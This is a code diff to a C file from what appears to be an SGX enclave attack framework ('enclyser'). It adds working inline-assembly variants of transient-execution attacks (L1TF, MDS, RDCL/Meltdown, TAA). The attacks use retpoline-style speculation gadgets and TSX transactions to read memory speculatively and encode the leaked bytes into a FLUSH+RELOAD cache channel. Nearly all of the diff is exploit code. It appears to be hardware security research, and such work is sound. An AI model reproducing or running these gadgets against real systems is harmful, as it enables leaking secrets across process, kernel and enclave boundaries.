@@ -2,13 +2,13 @@
 
 /**
  * @brief the defines and functions that are shared by trusted libraries and untrusted libraries
- * 
+ *
  */
 #ifdef NAMESPACE_SGX_SHARED
 
 /**
  * @brief Try different variants of the l1des attack.
- * 
+ *
  * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
@@ -22,7 +22,7 @@ static void l1des_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *atta
 
 /**
  * @brief Try different variants of the l1tf attack.
- * 
+ *
  * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
@@ -31,24 +31,60 @@ static void l1des_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *atta
  */
 static void l1tf_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
-    uint64_t rdi, rsi, rdx, rcx, r8;
+    uint64_t rax, rdi, rsi, rdx, rcx, r8, r9;
 
     ASSERT((0 <= attack_spec->offset) && (attack_spec->offset < attaking_buffer->size));
 
     rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
-    rsi = (uint64_t)attaking_buffer->buffer; /** consistent during the process */
+    rsi = (uint64_t)attaking_buffer->shadow; /** consistent during the process */
     rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
     rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
-    r8 = (uint64_t)attaking_buffer->shadow;  /** consistent during the process */
+    r8 = (uint64_t)attaking_buffer->buffer;  /** consistent during the process */
+    r9 = 0;                                  /** consistent during the process */
 
     switch (attack_spec->minor)
     {
     case ATTACK_MINOR_NONE:
         break;
+    case ATTACK_MINOR_NO_TSX:
+        asm volatile(
+            "movq %5, %%r8\n"
+            "movq %6, %%r9\n"
+            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
+            "mfence\n"
+            "call 2f\n"
+            "movzbq (%%rdi, %%rsi), %%rax\n"
+            "shl %%cl, %%rax\n"
+            "movzbq (%%rax, %%rdx), %%rax\n"
+            "3: pause\n"
+            "jmp 3b\n"
+            "2:\n"
+            "movabs $1f, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "mov %%eax, (%%rsp)\n"
+            "retq\n"
+            "1:\n"
+            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
+            :
+            : "r8", "r9");
+        break;
+    case ATTACK_MINOR_TSX:
     case ATTACK_MINOR_STABLE:
         asm volatile(
-            "movq %4, %%r8\n"
-            "tzcnt %%rcx, %%rcx\n"  /** rcx = log2(CACHELINE_SIZE) */
+            "movq %5, %%r8\n"
+            "movq %6, %%r9\n"
+            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
             "mfence\n"
             "xbegin 1f\n"
             "movzbq (%%rdi, %%rsi), %%rax\n"
@@ -56,9 +92,9 @@ static void l1tf_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attak
             "movzbq (%%rax, %%rdx), %%rax\n"
             "xend\n"
             "1:\n"
+            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
             :
-            : "D"(rdi), "S"(rsi), "d"(rdx), "c"(rcx), "r"(r8)
-            :);
+            : "r8", "r9");
         break;
     default:
         break;
@@ -67,7 +103,7 @@ static void l1tf_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attak
 
 /**
  * @brief Try different variants of the lvi attack.
- * 
+ *
  * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
@@ -81,7 +117,7 @@ static void lvi_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaki
 
 /**
  * @brief Try different variants of the mds attack.
- * 
+ *
  * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
@@ -90,57 +126,29 @@ static void lvi_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaki
  */
 static void mds_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
-    uint64_t rdi, rsi, rdx, rcx, r8;
+    uint64_t rax, rdi, rsi, rdx, rcx, r8, r9;
 
     ASSERT((0 <= attack_spec->offset) && (attack_spec->offset < attaking_buffer->size));
 
     rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
-    rsi = (uint64_t)attaking_buffer->buffer; /** consistent during the process */
+    rsi = (uint64_t)attaking_buffer->shadow; /** consistent during the process */
     rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
     rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
-    r8 = (uint64_t)attaking_buffer->shadow;  /** consistent during the process */
+    r8 = (uint64_t)attaking_buffer->buffer;  /** consistent during the process */
+    r9 = 0;                                  /** consistent during the process */
 
     switch (attack_spec->minor)
     {
     case ATTACK_MINOR_NONE:
         break;
-    // case ATTACK_MINOR_NO_TSX:
-    //     asm volatile(
-    //         "movq %4, %%r8\n"
-    //         "tzcnt %%rcx, %%rcx\n"  /** rcx = log2(CACHELINE_SIZE) */
-    //         "mfence\n"
-    //         "call 2f\n"
-    //         "clflush (%%r8)\n"
-    //         "movzbq (%%rdi, %%rsi), %%rax\n"
-    //         "shl %%cl, %%rax\n"
-    //         "movzbq (%%rax, %%rdx), %%rax\n"
-    //         "3: pause\n"
-    //         "jmp 3b\n"
-    //         "2:\n"
-    //         "movabs $1f, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "imulq $1, %%rax, %%rax\n"
-    //         "mov %%eax, (%%rsp)\n"
-    //         "retq\n"
-    //         "1:\n"
-    //         :
-    //         : "D"(rdi), "S"(rsi), "d"(rdx), "c"(rcx), "r"(r8)
-    //         :);
-    //         break;
+    case ATTACK_MINOR_NO_TSX:
+        break;
+    case ATTACK_MINOR_TSX:
     case ATTACK_MINOR_STABLE:
         asm volatile(
-            "movq %4, %%r8\n"
-            "tzcnt %%rcx, %%rcx\n"  /** rcx = log2(CACHELINE_SIZE) */
+            "movq %5, %%r8\n"
+            "movq %6, %%r9\n"
+            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
             "mfence\n"
             "clflush (%%r8)\n"
             "xbegin 1f\n"
@@ -149,9 +157,90 @@ static void mds_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaki
             "movzbq (%%rax, %%rdx), %%rax\n"
             "xend\n"
             "1:\n"
+            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
             :
-            : "D"(rdi), "S"(rsi), "d"(rdx), "c"(rcx), "r"(r8)
-            :);
+            : "r8", "r9");
+        break;
+    default:
+        break;
+    }
+}
+
+/**
+ * @brief Try different variants of the rdcl attack.
+ *
+ * @param attack_spec the specified attack
+ * @param attaking_buffer the buffer used by the attack
+ * @param encoding_buffer the buffer used to encode data leaked
+ *
+ * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
+ */
+static void rdcl_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
+{
+    uint64_t rax, rdi, rsi, rdx, rcx, r8, r9;
+
+    ASSERT((0 <= attack_spec->offset) && (attack_spec->offset < attaking_buffer->size));
+
+    rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
+    rsi = (uint64_t)attaking_buffer->shadow; /** consistent during the process */
+    rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
+    rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
+    r8 = (uint64_t)attaking_buffer->buffer;  /** consistent during the process */
+    r9 = 0;                                  /** consistent during the process */
+
+    switch (attack_spec->minor)
+    {
+    case ATTACK_MINOR_NONE:
+        break;
+    case ATTACK_MINOR_NO_TSX:
+    case ATTACK_MINOR_STABLE:
+        asm volatile(
+            "movq %5, %%r8\n"
+            "movq %6, %%r9\n"
+            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
+            "mfence\n"
+            "call 2f\n"
+            "movzbq (%%rdi, %%rsi), %%rax\n"
+            "shl %%cl, %%rax\n"
+            "movzbq (%%rax, %%rdx), %%rax\n"
+            "3: pause\n"
+            "jmp 3b\n"
+            "2:\n"
+            "movabs $1f, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "imulq $1, %%rax, %%rax\n"
+            "mov %%eax, (%%rsp)\n"
+            "retq\n"
+            "1:\n"
+            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
+            :
+            : "r8", "r9");
+        break;
+    case ATTACK_MINOR_TSX:
+        asm volatile(
+            "movq %5, %%r8\n"
+            "movq %6, %%r9\n"
+            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
+            "mfence\n"
+            "xbegin 1f\n"
+            "movzbq (%%rdi, %%rsi), %%rax\n"
+            "shl %%cl, %%rax\n"
+            "movzbq (%%rax, %%rdx), %%rax\n"
+            "xend\n"
+            "1:\n"
+            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
+            :
+            : "r8", "r9");
         break;
     default:
         break;
@@ -160,7 +249,7 @@ static void mds_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaki
 
 /**
  * @brief Try different variants of the taa attack.
- * 
+ *
  * @param attack_spec the specified attack
  * @param attaking_buffer the buffer used by the attack
  * @param encoding_buffer the buffer used to encode data leaked
@@ -169,24 +258,29 @@ static void mds_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaki
  */
 static void taa_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
 {
-    uint64_t rdi, rsi, rdx, rcx, r8;
+    uint64_t rax, rdi, rsi, rdx, rcx, r8, r9;
 
     ASSERT((0 <= attack_spec->offset) && (attack_spec->offset < attaking_buffer->size));
 
     rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
-    rsi = (uint64_t)attaking_buffer->buffer; /** consistent during the process */
+    rsi = (uint64_t)attaking_buffer->shadow; /** consistent during the process */
     rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
     rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
-    r8 = (uint64_t)attaking_buffer->shadow;  /** consistent during the process */
+    r8 = (uint64_t)attaking_buffer->buffer;  /** consistent during the process */
+    r9 = 0;                                  /** consistent during the process */
 
     switch (attack_spec->minor)
     {
     case ATTACK_MINOR_NONE:
         break;
+    case ATTACK_MINOR_NO_TSX:
+        break;
+    case ATTACK_MINOR_TSX:
     case ATTACK_MINOR_STABLE:
         asm volatile(
-            "movq %4, %%r8\n"
-            "tzcnt %%rcx, %%rcx\n"  /** rcx = log2(CACHELINE_SIZE) */
+            "movq %5, %%r8\n"
+            "movq %6, %%r9\n"
+            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
             "mfence\n"
             "clflush (%%r8)\n"
             "sfence\n"
@@ -197,9 +291,9 @@ static void taa_attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaki
             "movzbq (%%rax, %%rdx), %%rax\n"
             "xend\n"
             "1:\n"
+            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
             :
-            : "D"(rdi), "S"(rsi), "d"(rdx), "c"(rcx), "r"(r8)
-            :);
+            : "r8", "r9");
         break;
     default:
         break;
@@ -224,6 +318,9 @@ void attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, 
     case ATTACK_MAJOR_MDS:
         mds_attack(attack_spec, attaking_buffer, encoding_buffer);
         break;
+    case ATTACK_MAJOR_RDCL:
+        rdcl_attack(attack_spec, attaking_buffer, encoding_buffer);
+        break;
     case ATTACK_MAJOR_TAA:
         taa_attack(attack_spec, attaking_buffer, encoding_buffer);
         break;
@@ -236,7 +333,7 @@ void attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, 
 
 /**
  * @brief the defines and functions that are exclusive to trusted libraries
- * 
+ *
  */
 #ifdef NAMESPACE_SGX_YES
 
@@ -244,7 +341,7 @@ void attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, 
 
 /**
  * @brief the defines and functions that are exclusive to untrusted libraries
- * 
+ *
  */
 #ifdef NAMESPACE_SGX_NO
 
